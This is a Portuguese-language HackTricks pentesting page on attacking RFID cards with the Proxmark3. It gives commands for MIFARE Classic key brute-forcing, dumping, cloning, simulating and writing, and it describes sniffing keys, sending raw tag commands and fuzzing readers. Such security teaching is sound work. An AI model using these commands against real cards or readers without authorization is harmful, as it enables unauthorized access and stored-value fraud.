# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Ataque a sistemas RFID com Proxmark3

Instale o cliente Proxmark3 RRG/Iceman, mantido ativamente, e o firmware correspondente. Em seguida, confirme a sintaxe dos comandos nessa versão, pois os comandos mais antigos mostrados abaixo podem ter mudado.<sup>[[1]](#references)[[5]](#references)</sup>

### Ataque ao MIFARE Classic 1KB

O MIFARE Classic 1K tem **16 setores**, cada um com **4 blocos** de **16 bytes**. O bloco 0 do fabricante contém os dados do UID/fabricante e é somente leitura em cartões NXP genuínos; cartões clone especiais ou “mágicos” podem permitir sua regravação.<sup>[[1]](#references)[[2]](#references)</sup>\
Para acessar cada setor, você precisa de **2 chaves** (**A** e **B**), armazenadas no **bloco 3 de cada setor** (trailer do setor). O trailer do setor também armazena os **bits de acesso**, que definem as permissões de **leitura e gravação** de **cada bloco** usando as 2 chaves.\
As 2 chaves são úteis, por exemplo, para conceder permissão de leitura se você souber a primeira e de gravação se souber a segunda.

Vários ataques podem ser realizados

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

O Proxmark3 permite realizar outras ações, como **eavesdropping** de uma **comunicação Tag to Reader**, para tentar encontrar dados sensíveis. Nesse cartão, você pode simplesmente fazer sniff da comunicação e calcular a chave usada, pois as **operações criptográficas usadas são fracas** e, conhecendo o texto claro e o texto cifrado, é possível calculá-la (ferramenta `mfkey64`).<sup>[[3]](#references)</sup>

#### Fluxo rápido do MiFare Classic para abuso de saldo armazenado

Para a sequência de recuperação de chave, comparação de saldos, campo de integridade e clonagem de UID — incluindo o transcript do cliente Proxmark3 e as limitações de cartões magic — consulte [Adulteração offline de valores armazenados no MiFare Classic](pentesting-rfid.md#mifare-classic-offline-stored-value-tampering-broken-crypto1).

### Comandos brutos

Às vezes, sistemas IoT usam **tags sem marca ou não comerciais**. Nesse caso, você pode usar o Proxmark3 para enviar **comandos brutos personalizados às tags**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Com essas informações, você pode tentar buscar informações sobre o cartão e sobre como se comunicar com ele. O Proxmark3 permite enviar comandos brutos, como: `hf 14a raw -p -b 7 26`

### Scripts

O software do Proxmark3 vem com uma lista pré-carregada de **scripts de automação** que você pode usar para realizar tarefas simples. Para obter a lista completa, use o comando `script list`. Em seguida, use o comando `script run`, seguido do nome do script:

```
proxmark3> script run mfkeys
```

Você pode criar um script para **fuzzing de leitores de tags**: basta copiar os dados de um **cartão válido**, escrever um **script Lua** que **randomize** um ou mais **bytes** aleatórios e verificar se o **leitor trava** em alguma iteração.

## References

- [1] [Wiki do Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki do Proxmark3: cartões HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Declaração da NXP sobre MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Exploração de vulnerabilidade em cartões NFC no KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [Proxmark3 da RRG/Iceman — instalação no Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
